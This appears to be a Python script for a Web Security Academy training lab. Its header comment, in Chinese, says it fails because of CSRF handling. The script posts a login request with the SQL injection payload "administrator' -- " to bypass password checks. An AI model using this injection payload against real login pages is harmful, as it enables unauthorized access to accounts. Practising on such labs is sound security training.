## 此版本好像因為csrf關係所以沒辦法正常通關

import requests
from typing import Optional

BASE_URL = "https://0aae00b704018616803849260096001f.web-security-academy.net/login"

# Initialize session
session = requests.Session()

def send_post_request(url: str, data: dict, timeout: int = 10) -> Optional[requests.Response]:
    try:
        # Send POST request with form-urlencoded data
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = session.post(url, data=data, headers=headers, timeout=timeout)
        return response
    except requests.RequestException as e:
        print(f"Request failed: {str(e)}")
        return None


def main():
    # Define payload and cookies
    payload = {
        "csrf": "3tyJSBrq64vB9MUlbOual58SIvSB1pOV",
        "username": "administrator' -- ",
        "password": "d"
    }
    
    # Send the request
    response = send_post_request(BASE_URL, payload)
    
    # Check response
    if response :
        print(f"Status Code: {response.status_code}")
        print(f"Response Text: {response.text}")
        print(f"Response Length: {len(response.text)}")
    else:
        print(f"Connection failed. Status Code: {response.status_code if response else 'No response'}")

if __name__ == "__main__":
    main()